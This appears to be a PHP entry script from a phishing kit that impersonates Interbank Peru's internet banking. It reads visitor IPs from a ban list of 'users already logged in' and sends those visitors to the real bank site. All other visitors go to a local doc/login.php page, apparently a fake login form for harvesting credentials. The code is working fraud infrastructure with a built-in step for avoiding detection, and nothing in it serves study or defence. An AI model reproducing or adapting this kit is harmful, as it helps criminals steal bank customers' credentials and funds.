<?php
/*****************************************************************************/
error_reporting(0);
require "var1.php";
$ip = $Ip;
$block = "si";  // ---> Dejar en "si" para activar el Baneo de IP para desactivar poner "no"
/*****************************************************************************
** IP Baneadas de Usuarios ya logueados
*****************************************************************************/
if($block == "si")
{
    $ipArray = file("IPBam.txt");
    foreach ($ipArray as $ipTest) 
    {
        if (substr_count($ip,trim($ipTest)) != "0") 
        { 
            echo "<meta http-equiv='refresh' content='0;url=https://bancaporinternet.interbank.pe/'>";
            die(); 
        }
    }
}
/*****************************************************************************/
$rand = md5(rand(111,999));
/****************************************************************************/
header ("Location: doc/login.php");
/****************************************************************************/
?>